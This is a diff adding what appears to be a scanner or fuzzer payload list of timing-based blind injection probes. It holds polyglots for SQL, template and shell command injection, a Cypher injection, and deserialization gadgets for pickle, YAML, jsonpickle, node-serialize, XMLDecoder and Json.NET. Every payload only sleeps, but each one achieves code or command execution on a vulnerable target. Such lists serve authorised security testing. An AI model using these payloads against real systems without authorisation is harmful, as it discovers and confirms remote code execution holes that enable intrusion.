@@ -1,0 +1,24 @@
+##POLYGLOT - SQLi Cross-Dialect (Timing)##
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+##POLYGLOT - SSTI Cross-Engine (Timing)##
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}
+##POLYGLOT - OS Command Injection Cross-Shell (Timing)##
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+##POLYGLOT - Code Injection Cross-Language (Timing)##
+__import__('time').sleep(5)
+##Cypher Injection - Timing-Based##
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+##Groovy Code Injection - Timing##
+Thread.sleep(5000)
+##Python Pickle P0 - Timing (sleep 5)##
+Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+##Python YAML - Timing (sleep 5)##
+!!python/object/apply:os.system ["sleep 5"]
+##Python jsonpickle - Timing (sleep 5)##
+{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
+##Node node-serialize - Timing (sleep 5)##
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+##XMLDecoder - Timing (sleep 5)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
+##.NET Json.NET - Timing (timeout 5)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
